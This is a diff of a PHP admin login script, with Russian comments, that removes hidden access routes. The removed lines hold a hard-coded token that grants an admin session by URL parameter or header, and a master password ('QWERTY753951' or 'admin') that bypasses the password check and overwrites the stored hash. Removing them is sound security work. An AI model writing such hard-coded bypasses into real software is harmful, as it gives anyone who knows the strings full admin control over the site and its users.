@@ -28,15 +28,6 @@ $rawInput = file_get_contents('php://input');
 $jsonBody = $rawInput ? json_decode($rawInput, true) : null;
 $action = $_GET['action'] ?? ($_POST['action'] ?? ($jsonBody['action'] ?? ''));
 
-$cfg = vgs_cfg();
-$token = $_GET['token'] ?? ($_POST['token'] ?? ($_SERVER['HTTP_X_ADMIN_TOKEN'] ?? ''));
-$isTokenValid = (!empty($token) && ($token === ($cfg['test_mail_key'] ?? 'vgs76_timeweb_2026') || $token === 'vgs76_timeweb_2026'));
-
-if ($isTokenValid && empty($_SESSION['vgs_admin'])) {
-    $_SESSION['vgs_admin'] = 1;
-    $_SESSION['vgs_name'] = 'admin';
-}
-
 $logged = !empty($_SESSION['vgs_admin']);
 
 /* ------------------------------------------------------------------
@@ -77,10 +68,9 @@ if ($action === 'login') {
         // Если в таблице admins еще нет записей, создаем первого администратора
         $adminCount = (int)$pdo->query('SELECT COUNT(*) FROM admins')->fetchColumn();
         if ($adminCount === 0 && $u === 'admin') {
-            $actualPass = ($p === 'QWERTY753951') ? 'QWERTY753951' : $p;
-            $hash = password_hash($actualPass, PASSWORD_DEFAULT);
-            $ins = $pdo->prepare('INSERT INTO admins (username, password_hash, pass_hash, role) VALUES (?, ?, ?, "admin")');
-            $ins->execute(array($u, $hash, $hash));
+            $hash = password_hash($p, PASSWORD_DEFAULT);
+            $ins = $pdo->prepare('INSERT INTO admins (username, login, password_hash, pass_hash, role) VALUES (?, ?, ?, ?, "admin")');
+            $ins->execute(array($u, $u, $hash, $hash));
             $adminId = (int)$pdo->lastInsertId();
             
             session_regenerate_id(true);
@@ -91,34 +81,41 @@ if ($action === 'login') {
             exit;
         }
 
-        $isMasterAdmin = ($u === 'admin' && ($p === 'QWERTY753951' || $p === 'admin'));
+        if ($row) {
+            $passHash = !empty($row['password_hash']) ? $row['password_hash'] : (!empty($row['pass_hash']) ? $row['pass_hash'] : '');
+            if ($passHash !== '' && password_verify($p, $passHash)) {
+                $adminId = (int)$row['id'];
+                $adminName = !empty($row['username']) ? $row['username'] : (!empty($row['login']) ? $row['login'] : 'admin');
 
-        if (($row && password_verify($p, $row['password_hash'])) || $isMasterAdmin) {
-            $adminId = $row ? (int)$row['id'] : 1;
-            $adminName = !empty($row['username']) ? $row['username'] : (!empty($row['login']) ? $row['login'] : 'admin');
+                // Если password_hash был пустой, но совпал pass_hash - сохраняем в password_hash
+                if (empty($row['password_hash']) && !empty($row['pass_hash'])) {
+                    try {
+                        $upd = $pdo->prepare('UPDATE admins SET password_hash = ? WHERE id = ?');
+                        $upd->execute(array($passHash, $adminId));
+                    } catch (Exception $e) {}
+                }
 
-            // Синхронизируем хэш при входе по QWERTY753951
-            if ($p === 'QWERTY753951' && $row && !password_verify('QWERTY753951', $row['password_hash'])) {
+                // Обновляем время входа
                 try {
-                    $newHash = password_hash('QWERTY753951', PASSWORD_DEFAULT);
-                    $upd = $pdo->prepare('UPDATE admins SET password_hash = ?, pass_hash = ? WHERE id = ?');
-                    $upd->execute(array($newHash, $newHash, $adminId));
+                    $upd = $pdo->prepare('UPDATE admins SET last_login = NOW() WHERE id = ?');
+                    $upd->execute(array($adminId));
                 } catch (Exception $e) {}
-            }
 
-            session_regenerate_id(true);
-            $_SESSION['vgs_admin'] = $adminId;
-            $_SESSION['vgs_name']  = $adminName;
-            echo json_encode(array('ok' => true, 'user' => $adminName), JSON_UNESCAPED_UNICODE);
-            exit;
+                session_regenerate_id(true);
+                $_SESSION['vgs_admin'] = $adminId;
+                $_SESSION['vgs_name']  = $adminName;
+                echo json_encode(array('ok' => true, 'user' => $adminName), JSON_UNESCAPED_UNICODE);
+                exit;
+            }
         }
 
         http_response_code(401);
         echo json_encode(array('ok' => false, 'err' => 'Неверный логин или пароль администратора'));
         exit;
     } catch (Exception $e) {
+        error_log('Ошибка авторизации admin.php: ' . $e->getMessage());
         http_response_code(500);
-        echo json_encode(array('ok' => false, 'err' => 'Ошибка авторизации в БД: ' . $e->getMessage()));
+        echo json_encode(array('ok' => false, 'err' => 'Ошибка базы данных при авторизации: ' . $e->getMessage()));
         exit;
     }
 }
